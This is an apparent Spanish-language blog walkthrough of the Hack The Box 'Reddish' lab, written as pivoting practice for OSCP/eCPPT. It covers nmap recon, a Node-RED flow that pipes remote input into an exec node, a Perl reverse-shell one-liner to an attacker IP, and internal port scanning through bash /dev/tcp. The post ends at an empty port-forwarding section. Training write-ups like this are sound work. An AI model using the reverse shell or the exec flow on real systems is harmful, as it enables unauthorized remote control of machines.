---
layout: post
title:  "[eCPPT/OSCP Style] - Pivoting Reddish"
date:   2021-10-17 09:29:20 +0700
categories: jekyll update
---
<figure>
<img src="/assets/img/reddishlogo.png" alt="reddishlogo">
</figure>

Este walkthrough muestra el paso a paso para explotar un laboratorio de hackthebox (Reddish), utilizado como entrenamiento para preparar el examen de OSCP o eCPTT especificamente para el skill de pivoting.

Conectar VPN de Hackthebox `sudo openvpn 5pok.ovpn` y realizar un ping a la maquina vulnerable `ping -c 1 10.10.10.94`


# Recon 
### Nmap
Utilizar [nmap][nmap] para empezar la fase de recon.

{% highlight bash %}
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.94

Nmap scan report for 10.10.10.94
Host is up (0.023s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  vsat-control

# Nmap done at Sat Jul 21 17:28:24 2018 -- 1 IP address (1 host up) scanned in 11.21 seconds

nmap -p 1880 -sC -sV -oA nmap/port1880 10.10.10.94

Nmap scan report for 10.10.10.94
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 21 17:37:09 2018 -- 1 IP address (1 host up) scanned in 12.71 seconds
{% endhighlight %}  

### NodeRed - p:1880

Solo tenemos un puerto abierto. Así que lo abri en el browser, me mostro un error de método GET.

<figure>
<img src="/assets/img/1.png" alt="1">
</figure>

Capture la request con burp suite y cambié la solicitud a POST y obtuve una respuesta. Contiene un ID y un path. Podemos acceder a esa ruta solo con un ID. Es un servicio [Node-RED][nodered]

<figure>
<img src="/assets/img/2.png" alt="2">
</figure>

# Code Execution / Shell in Node-Red

Deberia quedar un flujo asi:

<figure>
<img src="/assets/img/3.png" alt="3">
</figure>

Tambien existe otra forma, importando el siguiente codigo (modificando el host 10.10.X.X)


{% highlight json %}
[
  { "id": "7235b2e6.4cdb9c", "type": "tab", "label": "Flow 1" },
  {
    "id": "d03f1ac0.886c28",
    "type": "tcp out",
    "z": "7235b2e6.4cdb9c",
    "host": "",
    "port": "",
    "beserver": "reply",
    "base64": false,
    "end": false,
    "name": "",
    "x": 786,
    "y": 350,
    "wires": []
  },
  {
    "id": "c14a4b00.271d28",
    "type": "tcp in",
    "z": "7235b2e6.4cdb9c",
    "name": "",
    "server": "client",
    "host": "10.10.XX.XX",
    "port": "3488",
    "datamode": "stream",
    "datatype": "buffer",
    "newline": "",
    "topic": "",
    "base64": false,
    "x": 281,
    "y": 337,
    "wires": [["4750d7cd.3c6e88"]]
  },
  {
    "id": "4750d7cd.3c6e88",
    "type": "exec",
    "z": "7235b2e6.4cdb9c",
    "command": "",
    "addpay": true,
    "append": "",
    "useSpawn": "false",
    "timer": "",
    "oldrc": false,
    "name": "",
    "x": 517,
    "y": 362.5,
    "wires": [["d03f1ac0.886c28"], ["d03f1ac0.886c28"], ["d03f1ac0.886c28"]]
  }
]
{% endhighlight %}  

{% highlight bash %}
root@kali# nc -lnvp 3488
listening on [any] 3488 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 51766
> id
uid=0(root) gid=0(root) groups=0(root)

> pwd
/node-red

> ls /home
node

> ls /home/node
{% endhighlight %}

Luego abrir una reverse shell con perl, ya que la maquina virtual no posee python, nc, etc

{% highlight perl %}
perl -e 'use Socket;$i="10.10.14.30";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
{% endhighlight %}

<figure>
<img src="/assets/img/4.png" alt="4">
</figure>

# NODERED -> CONTAINER TWO (AKA WWW)
### Local Enumeration

{% highlight bash %}
# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
{% endhighlight %}

Podemos ver que estamos dentro de un contenedor.

<figure>
<img src="/assets/img/5.png" alt="5">
</figure>

### Network Enumeration

Utilizaremos un one piner para ver los host que estan activos dentro de la red.

{% highlight bash %}
# for i in $(seq 1 20); do (ping -c 1 172.18.0.$i | grep "bytes from"); done
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.032 ms
# for i in $(seq 1 20); do (ping -c 1 172.19.0.$i | grep "bytes from"); done
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.106 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.170 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.022 ms
{% endhighlight %}

Ahora tenemos dos nuevos host

<figure>
<img src="/assets/img/6.png" alt="6">
</figure>

Port scan en bash

{% highlight bash %}
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.2/$p && echo "$p open") 2>/dev/null; done'
6379 open
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.4/$p && echo "$p open") 2>/dev/null; done'
80 open
{% endhighlight %}

# Pivoting 
### Port Forwarding






[nmap]: https://github.com/nmap/nmap
[nodered]: https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/

